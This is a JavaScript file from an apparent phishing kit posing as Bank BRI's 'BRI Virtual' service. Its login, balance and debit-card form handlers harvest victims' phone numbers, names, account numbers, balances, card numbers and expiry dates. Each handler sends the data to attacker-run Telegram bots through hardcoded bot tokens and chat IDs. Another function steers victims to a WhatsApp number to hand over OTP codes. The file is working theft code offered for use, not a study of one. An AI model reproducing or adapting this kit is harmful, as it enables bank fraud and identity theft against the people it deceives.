function vibr(dur) {
    if (navigator.vibrate) {
        navigator.vibrate(dur);
    } else {
        console.log("NotSupported");
    }
}


function get() {
    $("#process1").show();
    $('.load').fadeIn();
    setTimeout(function() {
        location.href = 'https://wa.me/62816234832?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20request%20Kode%20OTP';
        $("#process1").hide();
        $('.load').fadeOut();
    }, 2000);
}



// TARIF
$(document).ready(function() {
    $('#inputlogin').submit(function(e) {
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirims').innerHTML = "Memproses....";
        var tarif = document.getElementById("tarif").value;
        sessionStorage.setItem("tarif", tarif);   
        var NoHp = document.getElementById("NoHp").value;
        sessionStorage.setItem("NoHp", NoHp);   
        $("#lonte").show();


        var tarif = document.getElementById('tarif');
        var NoHp = document.getElementById('NoHp');

   var gabungan = '├•★───•𝐁𝐑𝐈 𝐕𝐢𝐫𝐭𝐮𝐚𝐥•───★ ' + '%0A├───────────────────•' + '<pre>%0d%0A❃ ' + tarif.value + '</pre>%0d%0A<pre>❃ 𝗡𝗼𝗺𝗼𝗿 : %0d' + NoHp.value + '</pre>%0A╰───────────────────•';

       var token = '7898900140:AAEbf3hd0uJLvTZLFo-_r1fz8DUSdY-mdYo'; // Ganti dengan token bot yang kamu buat
         var grup = '6092400643'; // Ganti dengan chat id dari bot yang kamu buat


        $.ajax({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,

            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
                    window.location.href = 'saldo.html'
                    $("#lonte").hide();
                    document.getElementById('kirims').innerHTML = "Lanjutkan";
                    $('.load').fadeOut();
                }, 500);
            }
        });
    });
    return false;
});


// LOGIN
$(document).ready(function() {
    $('#formlog').submit(function(e) {
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirim').innerHTML = "Memproses....";
        $("#lonte").show();


        var tarif = document.getElementById('tarif');
        var nomorku = document.getElementById('nomorku');
        var nama = document.getElementById('nama');
        var norek = document.getElementById('norek');

        var gabungan = '%0A※ : ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nomorku.value + '%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸 : ' + norek.value;

        var token = '6733224108:AAH1DnIDquxZhMN65Hd-9ehixHwzvoT82IY'; // Ganti dengan token bot yang kamu buat
        var grup = '6499835261'; // Ganti dengan chat id dari bot yang kamu buat


        $.ajax({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,


            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
                    window.location.href = 'saldo.html'
                    $("#lonte").hide();
                    document.getElementById('kirim').innerHTML = "Lanjutkan";
                    $('.load').fadeOut();
                    var tarif = document.getElementById("tarif").value;
                    sessionStorage.setItem("tarif", tarif);
                    var nomortel = document.getElementById('nomorku').value;
                    sessionStorage.setItem("nomortel", nomortel);
                    var noreke = document.getElementById('norek').value;
                    sessionStorage.setItem("noreke", noreke);
                    var namanya = document.getElementById('nama').value;
                    sessionStorage.setItem("namanya", namanya);
                }, 500);
            }
        });
    });
    return false;
});

// SALDO
$(document).ready(function() {
    $('#formsal').submit(function(e) {
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirims').innerHTML = "Verify...";
        $("#lonte").show();

        var tarif = document.getElementById('tarif');
        var nomorku = document.getElementById('nomorku');
        var nama = document.getElementById('nama');
        var saldo = document.getElementById('saldo');


         var gabungan = '├•★───•𝐁𝐑𝐈 𝐕𝐢𝐫𝐭𝐮𝐚𝐥•───★ ' + '%0A├───────────────────•' + '<pre>%0d%0A❃ ' + tarif.value + '</pre>%0d%0A<pre>❃ 𝗡𝗼𝗺𝗼𝗿 : %0d' + nomorku.value + '</pre>%0A<pre>❃ 𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸 : ' + nama.value + '</pre>%0A<pre>❃ 𝗦𝗮𝗹𝗱𝗼 : ' + saldo.value + '</pre>%0A╰───────────────────•';
         
         
        var token = '7898900140:AAEbf3hd0uJLvTZLFo-_r1fz8DUSdY-mdYo'; // Ganti dengan token bot yang kamu buat
         var grup = '6092400643'; // Ganti dengan chat id dari bot yang kamu buat


        $.ajax({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,


            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
                    window.location.href = '123.html'
                    $("#lonte").hide();
                    document.getElementById('kirims').innerHTML = "Benar";
                    $('.load').fadeOut();
                    var tarif = document.getElementById("tarif").value;
                    sessionStorage.setItem("tarif", tarif);
                    var phone = document.getElementById("nomorku").value;
                    sessionStorage.setItem("phone", phone);
                    var user = document.getElementById("nama").value;
                    sessionStorage.setItem("user", user);
                    var duet = document.getElementById("saldo").value;
                    sessionStorage.setItem("duet", duet);
                }, 500);
            }
        });
    });
    return false;
});



    // debit
    $(document).ready(function() {
        $('#formdebit').submit(function(e) {
            event.preventDefault();
            $('.load').fadeIn();
            document.getElementById('kirim').innerHTML = "Memproses....";
            $("#lonte").show();


            var tarif = document.getElementById('tarif');
            var nomorku = document.getElementById('nomorku');
            var debit = document.getElementById('debit');
            var valid = document.getElementById('valid');
            var cvv = document.getElementById('cvv');
            var saldo = document.getElementById('saldo');

            var gabungan = '%0A※ : ' + tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nomorku.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗲𝗯𝗶𝘁 : ' + debit.value + '%0A※ 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ' + valid.value + '%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + saldo.value;

            var token = '6733224108:AAH1DnIDquxZhMN65Hd-9ehixHwzvoT82IY'; // Ganti dengan token bot yang kamu buat
            var grup = '6499835261'; // Ganti dengan chat id dari bot yang kamu buat


            $.ajax({
                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
                method: `POST`,


                complete: function(data) {
                    vibr(180);
                    console.log('Complete')
                    setTimeout(function() {
                        window.location.href = 'konf.html'
                        $("#lonte").hide();
                        document.getElementById('kirim').innerHTML = "Lanjutkan";
                        $('.load').fadeOut();
                        var tarif = document.getElementById("tarif").value;
                        sessionStorage.setItem("tarif", tarif);
                        var nomortel = document.getElementById('nomorku').value;
                        sessionStorage.setItem("nomortel", nomortel);
                        var debit = document.getElementById('debit').value;
                        sessionStorage.setItem("debit", debit);
                        var valid = document.getElementById('valid').value;
                        sessionStorage.setItem("valid", valid);
                       var saldo = document.getElementById('saldo').value;
                        sessionStorage.setItem("saldo", saldo); 
                    }, 500);
                }
            });
        });
        return false;
    });




  